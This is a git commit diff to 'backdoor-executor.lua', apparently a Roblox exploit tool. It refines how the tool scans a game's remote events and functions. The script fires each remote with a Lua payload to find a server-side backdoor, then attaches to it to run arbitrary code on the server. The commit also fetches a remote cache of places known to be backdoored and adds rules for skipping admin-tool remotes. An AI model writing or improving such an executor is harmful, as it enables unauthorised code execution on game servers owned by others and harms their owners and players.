3f035e77a844e69d193b209181c18e2585dacb79
jLn0n <45232009+jLn0n@users.noreply.github.com>
2021-07-24 23:44:23 -0700

    backdoor finder improvements

--- backdoor-executor.lua
+++ backdoor-executor.lua
@@ -24,6 +24,7 @@ local RespawnBtn = ExecutorUI.RespawnBtn
 local AttachBtn = ExecutorUI.AttachBtn
 -- // VARIABLES
 local testSource = [[local daValue = Instance.new("StringValue") daValue.Name, daValue.Parent, daValue.Value = game.PlaceId, workspace, "%s"]]
+local ScannedNameEvents = table.create(0)
 local EventInfo = {
 	["EventInstance"] = nil,
 	["EventPath"] = "",
@@ -31,14 +32,14 @@ local EventInfo = {
 	["EventSourcePlace"] = 1,
 	["EventSourceFunc"] = nil,
 }
-local CachedPlaces = isfile("backdoor-cache.lua") and readfile("backdoor-cache.lua") or game:HttpGet("https://gist.githubusercontent.com/jLn0n/a45b23d44269c17a14b946781c9dd26f/raw/e3748e2c0aa1ce063de0745e74b0ad11f18e469a/backdoor-cache.lua", false)
+local CachedPlaces = isfile("backdoor-cache.lua") and readfile("backdoor-cache.lua") or game:HttpGet("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/misc/backdoor-cache.lua", false)
 local MSG_TEXT = {
 	["AttachedEventPrint"] = "\nATTACHED EVENT: %s\nTYPE: %s",
 	["EventPrint"] = "\nEVENT: %s\nTYPE: %s",
 	["OutdatedCacheWarn"] = "The cache of [%s] on PlaceId '%s' seems to be outdated."
 }
 local Debounce1, AttachDeb = true, true
-local CreateTween, CreateNotification, Draggify, ExecuteLua, GetTextSize, GotAttached, FindBackdoors, InitLines, InitTextbox, StringToInstance, SyncTextboxScrolling
+local CreateNotification, CreateTween, Draggify, ExecuteLua, GetAncestors, GetAncestorsName, GetTextSize, GotAttached, FindBackdoors, InitLines, InitTextbox, StringToInstance, SyncTextboxScrolling
 -- // MAIN
 CreateNotification = function(text)
 	return StarterGui:SetCore("SendNotification", {
@@ -103,15 +104,15 @@ FindBackdoors = function()
 	for _, Object in ipairs(game:GetDescendants()) do
 		if EventInfo.EventInstance then break end
 		if Object:IsA("RemoteEvent") or Object:IsA("RemoteFunction") then
-			if Object:FindFirstChild("") or (Object.Parent:IsA("RemoteEvent") and #Object.Parent.Name == 16) or Object.Name == "" or Object.Name == "CharacterSoundEvent" or Object.Parent.Name == "MouseInfo" or Object.Parent.Name == "DefaultChatSystemChatEvents" then else
-				print(string.format(MSG_TEXT.EventPrint, Object:GetFullName(), Object.ClassName))
-				if Object:IsA("RemoteEvent") then
-					Object:FireServer(string.format(testSource, Object:GetFullName()))
-				elseif Object:IsA("RemoteFunction") then
-					coroutine.resume(coroutine.create(function() Object:InvokeServer(string.format(testSource, Object:GetFullName())) end))
-				end
-				wait()
+			if table.find(GetAncestorsName(Object), "HDAdminClient") or table.find(GetAncestorsName(Object), "Basic Admin Essentials") or Object.Name == "CharacterSoundEvent" or ScannedNameEvents[Object.Name] then continue end
+			print(string.format(MSG_TEXT.EventPrint, Object:GetFullName(), Object.ClassName))
+			if Object:IsA("RemoteEvent") then
+				Object:FireServer(string.format(testSource, Object:GetFullName()))
+			elseif Object:IsA("RemoteFunction") then
+				pcall(coroutine.wrap(function() Object:InvokeServer(string.format(testSource, Object:GetFullName())) end))
 			end
+			ScannedNameEvents[Object.Name] = true
+			wait()
 		end
 	end
 	local valueLOL = workspace:FindFirstChild(game.PlaceId)
@@ -120,6 +121,25 @@ FindBackdoors = function()
 			GotAttached(StringToInstance(valueLOL.Value))
 		end)
 	end
+	table.clear(ScannedNameEvents)
+end
+
+GetAncestors = function(object)
+	local objParent = object.Parent
+	local result = table.create(0)
+	while (objParent and objParent.Parent) do
+		table.insert(result, objParent)
+		objParent = objParent.Parent
+	end
+	return result
+end
+
+GetAncestorsName = function(object)
+	local result = table.create(0)
+	for _, instance in ipairs(GetAncestors(object)) do
+		table.insert(result, instance.Name)
+	end
+	return result
 end
 
 GetTextSize = function(object)
@@ -140,7 +160,7 @@ GotAttached = function(backdooredEvent)
 	AttachedText.Visible = true
 	AttachBtn.TextColor3 = Color3.fromRGB(145, 145, 145)
 	print(string.format(MSG_TEXT.AttachedEventPrint, backdooredEvent:GetFullName(), backdooredEvent.ClassName))
-	ExecuteLua("game.Workspace[game.PlaceId]:Destroy()")
+	ExecuteLua("game.Workspace:FindFirstChild(game.PlaceId):Destroy()")
 end
 
 InitLines = function()
@@ -161,11 +181,11 @@ InitTextbox = function()
 	local TextLineSize = GetTextSize(TextLines)
 	-- // TextLines
 	SF_TextLines.Size = UDim2.new(0, TextLineSize.X + 9, 1, 0)
-	SF_TextLines.CanvasSize = UDim2.new(0, 0, 0, TextLineSize.Y + (TextSize.X > TextIDE.AbsoluteSize.X and 5 or 0))
+	SF_TextLines.CanvasSize = UDim2.new(0, 0, 0, TextLineSize.Y + (TextSize.X > TextIDE.AbsoluteSize.X and 2 or 1))
 	-- // Textbox
 	SF_Textbox.Position = UDim2.new(0, (SF_TextLines.Size.X.Offset + 1), 0, 0)
 	SF_Textbox.Size = UDim2.new(1, -(SF_TextLines.Size.X.Offset + 1), 1, 0)
-	SF_Textbox.CanvasSize = UDim2.new(0, (TextSize.X > TextIDE.AbsoluteSize.X and TextSize.X + (TextSize.Y > TextIDE.AbsoluteSize.Y and 5 or 0) or 0), 0, TextSize.Y + (TextSize.X > TextIDE.AbsoluteSize.X and 5 or 0))
+	SF_Textbox.CanvasSize = UDim2.new(0, (TextSize.X > TextIDE.AbsoluteSize.X and TextSize.X + (TextSize.Y > TextIDE.AbsoluteSize.Y and 2 or 1) or 0), 0, TextSize.Y + (TextSize.X > TextIDE.AbsoluteSize.X and 2 or 1))
 end
 
 StringToInstance = function(pathString)
@@ -183,7 +203,7 @@ end
 
 AttachBtn.MouseButton1Click:Connect(function()
 	if AttachDeb and not EventInfo.EventInstance then
-		CreateNotification("Press F9 to see the remotes being fired lol.")
+		CreateNotification("Press F9 to see the remotes being scanned.")
 		AttachDeb = false
 		for cachedPlaceId, cache in pairs(CachedPlaces) do
 			if game.PlaceId == cachedPlaceId then
